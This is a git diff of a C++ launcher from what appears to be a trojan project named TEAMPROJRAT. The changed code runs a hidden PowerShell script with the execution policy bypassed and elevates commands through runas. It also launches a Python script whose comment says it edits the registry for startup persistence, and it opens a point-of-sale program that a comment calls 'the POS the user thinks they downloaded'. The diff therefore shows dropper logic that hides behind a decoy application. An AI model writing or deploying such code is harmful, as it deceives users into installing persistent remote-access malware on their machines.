@@ -16,14 +16,11 @@ int main()
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
     Sleep(2000);
     system("setx path \"%PATH%;C:\\Python38\\\"");
-    system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
-    Sleep(2000);
-    system("exit");
+    system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pips
     Sleep(10000);
-    system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
+    system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c pip install openpyxl'"); //openpyxl is needed to run pos.py
     Sleep(2000);
-    system("python .\\persistence\\add_startup.py\n"); //starts the registry editing py file after python is installed
-    system(".\\UDP_Connection\\pos.pyw\n"); //starts the POS the user thinks they downloaded
+    system("start /WAIT powershell Start-Process cmd -Verb runas -ArgumentList '/c python \"C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\persistence\\add_startup.py\"'"); //starts the registry editing py file after python is installed
     system("cd \"C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw");
     system("exit");
     return 0;
